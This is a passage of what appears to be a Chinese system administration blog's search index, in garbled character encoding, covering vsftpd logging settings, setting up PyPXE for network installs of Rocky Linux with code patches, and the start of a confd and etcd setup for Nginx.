”å‘æ–¹ä¾¿å°±ç»™ä»–ä»¬åœ¨å†…ç½‘å¼€é€šäº† vsftpd çš„æœåŠ¡ã€‚\nç»“æœ java ç›´æ¥æœ‰å°å¥½çš„ ftp library å¯ç”¨ï¼Œå¤§å®¶å°±ç›´æ¥ç”¨äº†ã€‚\nå¯¼è‡´ä»»ä½•å•ç‹¬çš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ éƒ½ä¼šèµ·ä¸€ä¸ª ftp å®ä¾‹ï¼Œæ²¡æœ‰å¤ç”¨ ftp çš„ socket é“¾æ¥ ã€‚ç³»ç»ŸæŒ¤å‹äº†å¤§é‡çš„socketè¿æ¥ã€‚\nçƒ¦æ¼å•Šï¼Œå‡ºäº†äº‹å°±éº»çƒ¦ã€‚éœ€è¦æŠŠæ—¥å¿—éƒ½è¯¦ç»†è®°ä¸‹æ¥\nåšæ³•å¦‚ä¸‹ï¼š\nvi /etc/vsftp/vsftpd.conf ...... dual_log_enable=YES log_ftp_protocol=YES xferlog_enable=YES xferlog_std_format=NO ...... è§£é‡Šä¸€ä¸‹ï¼š\ndual_log_enable \u0026mdash; å’Œ xferlog_enable ååŒï¼Œä¼šå†™ä¸¤ä»½æ—¥å¿—ï¼Œä¸€ä»½åˆ°/var/log/xferlogï¼Œä¸€ä»½åˆ°/var/log/vsftpd.log\nlog_ftp_protocol \u0026mdash; å’Œ xferlog_enable ååŒï¼ŒåŒæ—¶xferlog_std_formatéœ€è¦è®¾ç½®ä¸ºNOï¼Œè¿™æ ·æ‰€æœ‰çš„ FTP å‘½ä»¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚\nè¿™æ ·æ‰€æœ‰äººçš„æ“ä½œéƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œå°±åé¡¾æ— å¿§äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211025-vsftpd/","summary":"\u003cp\u003eä¸ºäº†ç ”å‘æ–¹ä¾¿å°±ç»™ä»–ä»¬åœ¨å†…ç½‘å¼€é€šäº† vsftpd çš„æœåŠ¡ã€‚\u003c/p\u003e\n\u003cp\u003eç»“æœ java ç›´æ¥æœ‰å°å¥½çš„ ftp library å¯ç”¨ï¼Œå¤§å®¶å°±ç›´æ¥ç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå¯¼è‡´ä»»ä½•å•ç‹¬çš„ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ éƒ½ä¼šèµ·ä¸€ä¸ª ftp å®ä¾‹ï¼Œæ²¡æœ‰å¤ç”¨ ftp çš„ socket é“¾æ¥ ã€‚ç³»ç»ŸæŒ¤å‹äº†å¤§é‡çš„socketè¿æ¥ã€‚\u003c/p\u003e\n\u003cp\u003eçƒ¦æ¼å•Šï¼Œå‡ºäº†äº‹å°±éº»çƒ¦ã€‚éœ€è¦æŠŠæ—¥å¿—éƒ½è¯¦ç»†è®°ä¸‹æ¥\u003c/p\u003e\n\u003cp\u003eåšæ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evi /etc/vsftp/vsftpd.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e......\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edual_log_enable\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eYES\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elog_ftp_protocol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eYES\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exferlog_enable\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eYES\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exferlog_std_format\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eNO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e......\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè§£é‡Šä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003edual_log_enable \u0026mdash; å’Œ xferlog_enable ååŒï¼Œä¼šå†™ä¸¤ä»½æ—¥å¿—ï¼Œä¸€ä»½åˆ°/var/log/xferlogï¼Œä¸€ä»½åˆ°/var/log/vsftpd.log\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003elog_ftp_protocol \u0026mdash; å’Œ xferlog_enable ååŒï¼ŒåŒæ—¶xferlog_std_formatéœ€è¦è®¾ç½®ä¸ºNOï¼Œè¿™æ ·æ‰€æœ‰çš„ FTP å‘½ä»¤éƒ½ä¼šè®°å½•ä¸‹æ¥ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eè¿™æ ·æ‰€æœ‰äººçš„æ“ä½œéƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œå°±åé¡¾æ— å¿§äº†ã€‚\u003c/p\u003e","title":"vsftpdçš„æ—¥å¿—è®¾ç½®"},{"content":"ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è¦æ­å»ºä¸€ä¸ªæ­£å¼çš„pxeè‡ªåŠ¨è£…æœºç³»ç»Ÿï¼Œéœ€è¦è£… dnsmasq åš dhcp + tftp ï¼Œéœ€è¦ç¼–è¯‘ ipxe æ¥è·å¾— undionly.kpxe ï¼Œéœ€è¦ http æœåŠ¡å™¨æ¥æä¾›èµ„æºä¸‹è½½ï¼Œrepo åŒæ­¥æœåŠ¡æ¥æä¾› repoã€‚ç»„ä»¶éå¸¸å¤šï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚\nå½“ç„¶ï¼Œè¿™ä¹ˆå¤šä¹Ÿæ˜¯æœ‰å¿…è¦çš„ï¼Œå› ä¸ºå¯ä»¥æŒç»­æä¾›ä¸€ä¸ªç¨³å®šçš„è£…æœºç³»ç»Ÿã€‚\nåœºæ™¯ä¸€æ¢ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æœ¬åœ°æœºæˆ¿é‡Œï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæƒ³æ­ä¸€å¥—ç¯å¢ƒçš„æ­¥éª¤å°±æ¯”è¾ƒç¹å¤äº†ã€‚\nPyPXE å°±æ˜¯éå¸¸ç®€å•çš„ä¸€ä¸ªç¨‹åºï¼Œå±…ç„¶è‡ªå·±å®ç°äº†ç”¨äº PXE çš„ dhcpã€tftp å’Œ http å…¨éƒ¨çš„åŠŸèƒ½ï¼Œè€Œä¸”æ”¯æŒ iPXEã€‚\nå¤ªç‰›é€¼äº†ï¼Œå‰æå•Šï¼ŒPyPXE æ˜¯åŸºäº Python 2.7 çš„ï¼ŒPython 3.xæ˜¯è¿è¡Œä¸äº†çš„ã€‚\næƒ³è®©å®ƒè·‘èµ·æ¥è¿˜å¿…é¡»åšä¸€å®šçš„ä¿®æ”¹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€ä¸‹è½½PyPXE git clone https://github.com/pypxe/PyPXE.git cd PyPXE ä¸‹è½½å°±è¡Œäº†ï¼Œä¸ç”¨å®‰è£…ã€‚\näºŒã€æ‰‹åŠ¨ç”Ÿæˆconfig.jsoné…ç½®æ–‡ä»¶ { \u0026#34;DHCP_SERVER_IP\u0026#34;: \u0026#34;192.168.85.27\u0026#34;, \u0026#34;DHCP_FILESERVER\u0026#34;: \u0026#34;192.168.85.27\u0026#34;, \u0026#34;DHCP_OFFER_BEGIN\u0026#34;: \u0026#34;192.168.85.200\u0026#34;, \u0026#34;DHCP_OFFER_END\u0026#34;: \u0026#34;192.168.85.250\u0026#34;, \u0026#34;DHCP_SUBNET\u0026#34;: \u0026#34;255.255.255.0\u0026#34;, \u0026#34;DHCP_ROUTER\u0026#34;: \u0026#34;192.168.85.1\u0026#34;, \u0026#34;DHCP_DNS\u0026#34;: \u0026#34;114.114.114.114\u0026#34;, \u0026#34;DHCP_SERVER_PORT\u0026#34;: 67, \u0026#34;DHCP_BROADCAST\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;DHCP_MODE_PROXY\u0026#34;: false, \u0026#34;DHCP_WHITELIST\u0026#34;: false, \u0026#34;HTTP_PORT\u0026#34;: 80, \u0026#34;LEASES_FILE\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;MODE_DEBUG\u0026#34;: \u0026#34;dhcp\u0026#34;, \u0026#34;MODE_VERBOSE\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;NBD_BLOCK_DEVICE\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;NBD_COPY_TO_RAM\u0026#34;: false, \u0026#34;NBD_COW\u0026#34;: true, \u0026#34;NBD_COW_IN_MEM\u0026#34;: false, \u0026#34;NBD_PORT\u0026#34;: 10809, \u0026#34;NBD_SERVER_IP\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;NBD_WRITE\u0026#34;: false, \u0026#34;NETBOOT_DIR\u0026#34;: \u0026#34;netboot\u0026#34;, \u0026#34;NETBOOT_FILE\u0026#34;: \u0026#34;boot.http.ipxe\u0026#34;, \u0026#34;STATIC_CONFIG\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;SYSLOG_PORT\u0026#34;: 514, \u0026#34;SYSLOG_SERVER\u0026#34;: null, \u0026#34;USE_DHCP\u0026#34;: true, \u0026#34;USE_HTTP\u0026#34;: true, \u0026#34;USE_IPXE\u0026#34;: true, \u0026#34;USE_TFTP\u0026#34;: true } ä¸Šé¢jsonæ–‡ä»¶æ— æ³•åŠ æ³¨è§£ï¼Œæˆ‘ä»¬æŠŠå®ƒåˆ†ä¸‰éƒ¨åˆ†\næœ¬æœºé…ç½®ï¼Œæœ¬æœºçš„åœ°å€éƒ½æ˜¯ 192.168.85.27\ndhcp çš„é…ç½®ï¼Œå¼€å§‹192.168.85.200ï¼Œç»“æŸ192.68.85.250ï¼Œæ©ç 255.255.255.0ï¼Œç½‘å…³192.168.85.1ï¼ŒDNS114.114.114.114\nç¬¬ä¸‰éƒ¨åˆ†ä¸ç”¨åŠ¨\nä¸‰ã€ä¸‹è½½ISOå¹¶ä¿®æ”¹ipxeè„šæœ¬ cd netboot wget http://mirrors.163.com/rocky/8/isos/x86_64/Rocky-8.4-x86_64-dvd1.iso mkdir rocky8.iso mount -o loop Rocky-8.4-x86_64-dvd1.iso rocky8.iso cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; boot.http.ipxe #!ipxe :start menu PXE Boot Options item shell iPXE shell item Rocky8 Install rocky8 item exit Exit to BIOS choose --default rocky8 --timeout 5000 option \u0026amp;\u0026amp; goto ${option} :shell shell :rocky8 set root http://192.168.85.27/rocky8.iso initrd ${root}/images/pxeboot/initrd.img kernel ${root}/images/pxeboot/vmlinuz inst.repo=${root}/ initrd=initrd.img ip=dhcp boot :exit exit EOF ä¸‰ã€ä¿®æ”¹æºä»£ç  è¿è¡Œä¸€ä¸‹ï¼š\npython -m pypxe.server --config config.json --debug all --verbose all å¦‚æœæˆ‘ä»¬èµ·ä¸€å°æœºå™¨æˆ–è€…è™šæœºï¼Œä¼šæŠ¥ç¬¬ä¸€ä¸ªé”™ï¼š\nUnicodeDecodeError: \u0026lsquo;ascii\u0026rsquo; codec can\u0026rsquo;t decode byte 0xc0 in position 0: ordinal not in range(128)\nè¿™ä¸ªæ˜¯ä»£ç æŠ¥é”™ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹\nvi pypxe/dhcp.py def tlv_encode(self, tag, value): \u0026#39;\u0026#39;\u0026#39;Encode a TLV option.\u0026#39;\u0026#39;\u0026#39; # æ³¨é‡Šæ‰ä¸‹é¢çš„ä¸¤è¡Œï¼Œæˆ‘ä»¬ä¸éœ€è¦æ‰“å°å‡ºæˆ‘ä»¬ä¸€å®šèƒ½çœ‹æ‡‚çš„å­—ç¬¦ï¼Œéƒ½æŒ‰byteså¤„ç†å³å¯ #if type(value) is str: # value = value.encode(\u0026#39;ascii\u0026#39;) value = bytes(value) return struct.pack(\u0026#39;BB\u0026#39;, tag, len(value)) + value ç„¶åæˆ‘ä»¬éœ€è¦ä¿®æ”¹ç¬¬äºŒä¸ªåœ°æ–¹ï¼Œç†ç”±æ˜¯è¿™ä¸ª PyPXE ä¼šåˆ¤æ–­ Client å‘è¿‡æ¥çš„ dhcp è¯·æ±‚ï¼Œå®ƒåªå®ç°äº†é’ˆå¯¹PXE-Clientçš„ Vendor-classï¼š\næ‰€ä»¥æˆ‘ä»¬ä¹Ÿè¦å±è”½ä¸€ä¸‹ï¼Œå¦åˆ™æŒ‰ç…§æ­£å¸¸è¿‡ç¨‹\nå®¢æˆ·ç«¯dhcp \u0026ndash;\u0026gt; PyPXE åï¼ŒPyPXE é€å›å®¢æˆ· ipxe è„šæœ¬ï¼Œç„¶åå®¢æˆ·å®‰è£…ï¼Œå½“åŠ è½½äº†vmlinuzå’Œinitrdä¹‹åä¼šè¿›å…¥anaconda-linuxè¿›è¡Œç³»ç»Ÿå®‰è£…ï¼Œè¿‡ç¨‹ä¸­ä¼šå†æ¬¡å‘DHCPæœåŠ¡å™¨ç”³è¯·IPåœ°å€ï¼Œ è¿™ä¸ªæ—¶å€™ä»–å‘DHCP Serverå‘å‡ºçš„discoverç”³è¯·æ˜¯å¾—ä¸åˆ°å›å¤çš„ï¼Œå› æ­¤å®‰è£…è¿‡ç¨‹å°†è¢«æ‰“æ–­ã€‚\nvi pypxe/dhcp.py def validate_req(self, client_mac): # client request is valid only if contains Vendor-Class = PXEClient \u0026#39;\u0026#39;\u0026#39;ä»£ç æ•´ä¸ªæ³¨é‡Šæ‰ï¼Œç›´æ¥è¿”å› True if self.whitelist and self.get_mac(client_mac) not in self.get_namespaced_static(\u0026#39;dhcp.binding\u0026#39;): self.logger.info(\u0026#39;Non-whitelisted client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) return False if 60 in self.options[client_mac] and \u0026#39;PXEClient\u0026#39;.encode() in self.options[client_mac][60][0]: self.logger.info(\u0026#39;PXE client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) return True self.logger.info(\u0026#39;Non-PXE client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) return False \u0026#39;\u0026#39;\u0026#39; return True è¿™æ ·ä¿®æ”¹åï¼Œå°±å¯ä»¥æ­£å¸¸å®‰è£…äº†ã€‚\næœåŠ¡å™¨å¯åŠ¨ï¼š\nå®¢æˆ·ç«¯å¯åŠ¨pxeå¼€å§‹å®‰è£…ï¼Œçœ‹ä¸‹é¢ï¼Œç³»ç»Ÿçš„ipxe dhcpä¸€æ¬¡ï¼Œç„¶åchainload.kpxe åˆä¸€æ¬¡ï¼Œanaconda åˆä¸€æ¬¡ï¼Œæœ€å°‘ä¼šå‘ä¸‰æ¬¡æˆ–æ›´å¤šçš„dhcpè¯·æ±‚ã€‚\nç”¨ VNC è¿è¿›å»å¯ä»¥çœ‹åˆ°å®‰è£…ç”»é¢ï¼Œå¦‚æœæ˜¯ kickstart å°±æ˜¯å…¨è‡ªåŠ¨å®‰è£…äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211022-pypxe/","summary":"\u003cp\u003eä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬è¦æ­å»ºä¸€ä¸ªæ­£å¼çš„pxeè‡ªåŠ¨è£…æœºç³»ç»Ÿï¼Œéœ€è¦è£… dnsmasq åš dhcp + tftp ï¼Œéœ€è¦ç¼–è¯‘ ipxe æ¥è·å¾— undionly.kpxe ï¼Œéœ€è¦ http æœåŠ¡å™¨æ¥æä¾›èµ„æºä¸‹è½½ï¼Œrepo åŒæ­¥æœåŠ¡æ¥æä¾› repoã€‚ç»„ä»¶éå¸¸å¤šï¼Œä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚\u003c/p\u003e\n\u003cp\u003eå½“ç„¶ï¼Œè¿™ä¹ˆå¤šä¹Ÿæ˜¯æœ‰å¿…è¦çš„ï¼Œå› ä¸ºå¯ä»¥æŒç»­æä¾›ä¸€ä¸ªç¨³å®šçš„è£…æœºç³»ç»Ÿã€‚\u003c/p\u003e\n\u003cp\u003eåœºæ™¯ä¸€æ¢ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æœ¬åœ°æœºæˆ¿é‡Œï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæƒ³æ­ä¸€å¥—ç¯å¢ƒçš„æ­¥éª¤å°±æ¯”è¾ƒç¹å¤äº†ã€‚\u003c/p\u003e\n\u003cp\u003ePyPXE å°±æ˜¯éå¸¸ç®€å•çš„ä¸€ä¸ªç¨‹åºï¼Œå±…ç„¶è‡ªå·±å®ç°äº†ç”¨äº PXE çš„ dhcpã€tftp å’Œ http å…¨éƒ¨çš„åŠŸèƒ½ï¼Œè€Œä¸”æ”¯æŒ iPXEã€‚\u003c/p\u003e\n\u003cp\u003eå¤ªç‰›é€¼äº†ï¼Œå‰æå•Šï¼ŒPyPXE æ˜¯åŸºäº Python 2.7 çš„ï¼ŒPython 3.xæ˜¯è¿è¡Œä¸äº†çš„ã€‚\u003c/p\u003e\n\u003cp\u003eæƒ³è®©å®ƒè·‘èµ·æ¥è¿˜å¿…é¡»åšä¸€å®šçš„ä¿®æ”¹ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¸‹è½½pypxe\"\u003eä¸€ã€ä¸‹è½½PyPXE\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/pypxe/PyPXE.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e PyPXE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‹è½½å°±è¡Œäº†ï¼Œä¸ç”¨å®‰è£…ã€‚\u003c/p\u003e\n\u003ch2 id=\"äºŒæ‰‹åŠ¨ç”Ÿæˆconfigjsoné…ç½®æ–‡ä»¶\"\u003eäºŒã€æ‰‹åŠ¨ç”Ÿæˆconfig.jsoné…ç½®æ–‡ä»¶\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_SERVER_IP\u0026#34;: \u0026#34;192.168.85.27\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_FILESERVER\u0026#34;: \u0026#34;192.168.85.27\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_OFFER_BEGIN\u0026#34;: \u0026#34;192.168.85.200\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_OFFER_END\u0026#34;: \u0026#34;192.168.85.250\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_SUBNET\u0026#34;: \u0026#34;255.255.255.0\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_ROUTER\u0026#34;: \u0026#34;192.168.85.1\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_DNS\u0026#34;: \u0026#34;114.114.114.114\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_SERVER_PORT\u0026#34;: 67,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_BROADCAST\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_MODE_PROXY\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_WHITELIST\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;HTTP_PORT\u0026#34;: 80,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;LEASES_FILE\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;MODE_DEBUG\u0026#34;: \u0026#34;dhcp\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;MODE_VERBOSE\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_BLOCK_DEVICE\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_COPY_TO_RAM\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_COW\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_COW_IN_MEM\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_PORT\u0026#34;: 10809,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_SERVER_IP\u0026#34;: \u0026#34;0.0.0.0\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_WRITE\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NETBOOT_DIR\u0026#34;: \u0026#34;netboot\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NETBOOT_FILE\u0026#34;: \u0026#34;boot.http.ipxe\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;STATIC_CONFIG\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;SYSLOG_PORT\u0026#34;: 514,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;SYSLOG_SERVER\u0026#34;: null,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_DHCP\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_HTTP\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_IPXE\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_TFTP\u0026#34;: true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢jsonæ–‡ä»¶æ— æ³•åŠ æ³¨è§£ï¼Œæˆ‘ä»¬æŠŠå®ƒåˆ†ä¸‰éƒ¨åˆ†\u003c/p\u003e","title":"PyPXE-ä¸€ä¸ªç‰›é€¼çš„ä¸€ç«™å¼PXEå®‰è£…åŒ…"},{"content":"ä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬ä»‹ç»äº† ETCD çš„å®¹å™¨åŒ–ï¼Œæè¿™ä»¶äº‹æƒ…çš„ä¸»è¦ç›®çš„å…¶å®æ˜¯è¦åŠ¨æ€æ›´æ–° Nginx çš„é…ç½®\nè¿™ä¸€ç« æˆ‘ä»¬å°±æ¥é…ç½® confd å’Œ Nginxï¼Œæ¥è¾¾åˆ°åŠ¨æ€æ›´æ–° Nginx é…ç½®çš„ç›®çš„\nä¸€ã€å®‰è£…é…ç½®confd ä¸‹è½½å¹¶å®‰è£…ï¼š\nwget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64 mv confd-0.16.0-linux-amd64 /usr/sbin/confd chmod +x /usr/sbin/confd ç”Ÿæˆé…ç½®æ–‡ä»¶ï¼š\næˆ‘ä»¬åœ¨ etcd ä¸­å­˜æ”¾çš„æ ¼å¼å¦‚ä¸‹\netcdctl set /nginx/app01/subdomain app1 etcdctl set /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34; /nginx/app01/subdomain \u0026#34;app01\u0026#34; /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34; /nginx/app01/upstream/app01_2 \u0026#34;192.168.0.2:5601\u0026#34; é‚£ä¹ˆï¼Œæˆ‘ä»¬å…ˆç”Ÿæˆ confd çš„é…ç½®æ–‡ä»¶ï¼š\nmkdir -p /etc/confd/{conf.d,templates} cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/confd/conf.d/nginx.toml 